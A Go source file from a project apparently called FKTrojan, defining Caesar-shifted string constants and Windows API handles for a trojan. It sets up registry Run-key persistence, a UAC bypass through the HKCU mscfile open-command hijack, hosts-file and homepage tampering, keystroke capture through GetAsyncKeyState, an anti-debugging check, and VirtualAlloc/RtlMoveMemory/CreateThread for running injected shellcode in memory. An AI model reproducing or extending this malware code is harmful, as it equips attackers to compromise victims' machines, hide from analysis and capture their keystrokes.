/*
Author: FreeKnight
不建议修改的变量数据
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"syscall"
)

//------------------------------------------------------------
var (
	//============================================================
	// 不要修改的配置
	//============================================================

	registryAutoRunPath string = common.Deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo")             //Software\Microsoft\Windows\CurrentVersion\Run
	homepagePath        string = common.Deobfuscate("Tpguxbsf]]Njdsptpgu]]Joufsofu!Fyqmpsfs]]Nbjo")              //Software\Microsoft\Internet Explorer\Main
	systemPoliciesPath  string = common.Deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Qpmjdjft]Tztufn") //Software\Microsoft\Windows\CurrentVersion\Policies\System

	bypassPath    string = common.Deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf]]tifmm]]pqfo]]dpnnboe") //HKCU\Software\Classes\mscfile\shell\open\command
	bypassPathAlt string = common.Deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf")                       //HKCU\Software\Classes\mscfile

	hostFilePath string = common.Deobfuscate("Tztufn43]]esjwfst]]fud]]") //system32/drivers/etc/

	user32   = syscall.NewLazyDLL(common.Deobfuscate("vtfs43/emm"))   //user32.dll
	kernel32 = syscall.NewLazyDLL(common.Deobfuscate("lfsofm43/emm")) //kernel32.dll

	procMessageBoxW       = user32.NewProc(common.Deobfuscate("NfttbhfCpyX"))         //MessageBoxW
	procGetAsyncKeyState  = user32.NewProc(common.Deobfuscate("HfuBtzodLfzTubuf"))    //GetAsyncKeyState
	procCreateMutex       = kernel32.NewProc(common.Deobfuscate("DsfbufNvufyX"))      //CreateMutexW
	procIsDebuggerPresent = kernel32.NewProc(common.Deobfuscate("JtEfcvhhfsQsftfou")) //IsDebuggerPresent

	procGetForegroundWindow   = user32.NewProc(common.Deobfuscate("HfuGpsfhspvoeXjoepx"))   //GetForegroundWindow
	procGetWindowTextW        = user32.NewProc(common.Deobfuscate("HfuXjoepxUfyuX"))        //GetWindowTextW
	procShowWindow            = user32.NewProc(common.Deobfuscate("TipxXjoepx"))            //ShowWindow
	procEnumWindows           = user32.NewProc(common.Deobfuscate("FovnXjoepxt"))           //EnumWindows
	procSystemParametersInfoW = user32.NewProc(common.Deobfuscate("TztufnQbsbnfufstJogpX")) //SystemParametersInfoW

	procVirtualAlloc        = kernel32.NewProc(common.Deobfuscate("WjsuvbmBmmpd"))        //VirtualAlloc
	procRtlMoveMemory       = kernel32.NewProc(common.Deobfuscate("SumNpwfNfnpsz"))       //RtlMoveMemory
	procCreateThread        = kernel32.NewProc(common.Deobfuscate("DsfbufUisfbe"))        //CreateThread
	procWaitForSingleObject = kernel32.NewProc(common.Deobfuscate("XbjuGpsTjohmfPckfdu")) //WaitForSingleObject
)

//------------------------------------------------------------
